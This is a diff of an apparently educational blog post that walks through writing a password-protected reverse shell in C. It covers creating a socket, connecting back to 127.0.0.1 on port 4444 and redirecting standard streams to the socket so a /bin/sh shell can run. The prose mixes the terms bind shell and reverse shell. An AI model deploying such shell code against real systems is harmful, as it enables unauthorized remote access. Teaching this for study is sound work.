@@ -34,6 +34,12 @@ In the process of creating a bind shell, we will be stepping through 7 stages:
   <li>Spawn the shell, if password is correct</li>
 </ol>
 
+Let's get started in coding out the reverse shell
+
+<h3>Stage 1 - Creating a new socket</h3>
+
+We will use the same skeleton program as before and import all our libraries and declare all variables:
+
 ```c
 #include<stdio.h>
 #include<stdlib.h>
@@ -51,19 +57,41 @@ int main()
         struct sockaddr_in server;
         int sock;
         int sockaddr_len = sizeof(struct sockaddr_in);
-        // Change arguments as needed
         char *arguments[] = { "/bin/sh", 0, "4444", "127.0.0.1", "YOLOOOOOOO" };
         char buf[16];
 
-        sock = socket(AF_INET, SOCK_STREAM, 0);
-      
-        server.sin_family = AF_INET;
-        server.sin_port = htons(atoi(arguments[2]));
-        server.sin_addr.s_addr = inet_addr(arguments[3]);
-        bzero(&server.sin_zero, 8);
+}
+```
 
-        connect(sock, (struct sockaddr *)&server, sockaddr_len);
+Creating the socket is handled by the [socket](https://man7.org/linux/man-pages/man2/socket.2.html) syscall.
 
+Referring to the man page for socket, it requires 3 arguments:
+
+<ul>
+    <li>Protocol Family - We will be using AF_INET (IPv4 Internet Protocols)</li>
+    <li>Communication Type - We will use SOCK_STREAM (TCP)</li>
+    <li>The third argument does not concern us so we will only pass 0</li>
+</ul>
+
+```c
+sock = socket(AF_INET, SOCK_STREAM, 0);
+```
+
+The return value for the above syscall will be a file descriptor for the new socket.
+
+<h3>Initiate the connection back to remote server</h3>
+
+
+```c
+server.sin_family = AF_INET;
+server.sin_port = htons(atoi(arguments[2]));
+server.sin_addr.s_addr = inet_addr(arguments[3]);
+bzero(&server.sin_zero, 8);
+
+connect(sock, (struct sockaddr *)&server, sockaddr_len);
+```
+
+```c
         dup2(sock, 0);
         dup2(sock, 1);
         dup2(sock, 2);
